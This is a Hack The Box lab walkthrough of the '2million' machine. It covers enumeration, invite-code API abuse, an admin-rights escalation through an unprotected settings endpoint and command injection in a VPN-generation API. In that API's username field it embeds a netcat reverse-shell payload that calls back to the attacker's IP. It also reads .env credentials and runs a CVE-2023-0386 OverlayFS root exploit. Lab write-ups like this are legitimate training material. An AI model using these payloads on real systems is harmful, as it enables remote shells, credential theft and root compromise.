#### Info Enum
`└─$ nmap  -sSCV 10.129.22.184  --min-rate 999`
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 12:45 +1000
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Hack The Box :: Penetration Testing Labs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
When try to register, got the response of invite-code required. `http://2million.htb/register?error=Get+an+invite+code+first`
check the js files, find a script Obfuscated.
http://2million.htb/js/inviteapi.min.js

use `https://thanhle.io.vn/de4js/`  to decode
```
function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```
access to this API using burp suite
```
POST /api/v1/invite/how/to/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=l81r8rosf9qm5tgn9n1o4ler52
Connection: keep-alive


{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```
decoded it 
`In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`
```
POST /api/v1/invite/generate HTTP/1.1
Host: 2million.htb

{"0":200,"success":1,"data":{"code":"V0dSSjQtUkFUWVItNFEzTFgtVFlHS0Q=","format":"encoded"}}

└─$ echo "V0dSSjQtUkFUWVItNFEzTFgtVFlHS0Q=" | base64 -d                                                      
WGRJ4-RATYR-4Q3LX-TYGKD  
```
we got the invite code, try to register a account using burpS
```
POST /api/v1/user/register HTTP/1.1
Host: 2million.htb
Content-Length: 114
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://2million.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/register?error=Get+an+invite+code+first
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=l81r8rosf9qm5tgn9n1o4ler52
Connection: keep-alive

code=5AW61-1YYGR-HJ3DD-QHT65&username=a%40a.com&email=a%40a.com&password=a%40a.com&password_confirmation=a%40a.com
```
we can also check APIs under v1
```
GET /api/v1 HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=l81r8rosf9qm5tgn9n1o4ler52
Connection: keep-alive

"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},

"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"
```
here try to interact with admin APIs
```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb

{"status":"danger","message":"Invalid content type."}
----------------------------------------------
Connection: keep-alive
Content-Type: application/json
Content-Length: 58

{
	"email":"a@a.com",
	"username":"a@a.com;id;"

}
----------------------------------------------
Content-Length: 8
Content-Type: application/json
{"status":"danger","message":"Missing parameter: email"}

Content-Length: 25
Content-Type: application/json
----------------------------------------------
{
"email":"a@a.com"
}

{"status":"danger","message":"Missing parameter: is_admin"}
----------------------------------------------
Content-Type: application/json

{
"email":"a@a.com",
"is_admin":"yes"
}
----------------------------------------------
{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}

{
"email":"a@a.com",
"is_admin":1
}
----------------------------------------------
{"id":13,"username":"a@a.com","is_admin":1}

GET /api/v1/admin/auth HTTP/1.1
Host: 2million.htb

{"message":true}
```
#### Foothold
We have changed the account to admin. play with the API VPN/generate/
```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" | jq
{
"status": "danger",
"message": "Missing parameter: username"
}
```
add username to body,
```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
"PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data
'{"username":"test"}'
client
dev tun
proto udp
remote edge-eu-release-1.hackthebox.eu 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
<SNIP>
```
If this VPN is being generated via the exec or system PHP function and there is
insufficient filtering in place - which is possible as this is an administrative only function - it might be
possible to inject malicious code in the username field and gain command execution
```
{
	"email":"a@a.com",
	"username":"a@a.com;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.187 8821 >/tmp/f;"

}
```
`└─$ nc -nvlp 8821     `
```
listening on [any] 8821 ...
connect to [10.10.14.187] from (UNKNOWN) [10.129.22.184] 40152
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@2million:~/html$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```
`www-data@2million:~/html$ cat .env`
```
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD= SuperDuperPass123
```
ssh it in
`admin@2million:/tmp$ cat /var/mail/admin `

#### Privi Escalate
```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
```
`admin@2million:/tmp$ uname -ar`
```
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
https://github.com/v4resk/red-book/blob/main/redteam/privilege-escalation/linux/kernel-exploits/overlayfs-exploits/cve-2023-0386-overlayfs.md

`admin@2million:/tmp$ ./exp`
```
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Apr 13 05:58 .
drwxrwxr-x 6 root   root     4096 Apr 13 05:58 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```

#### Lesson learned
- check js files, and obfused ones
- API and json body
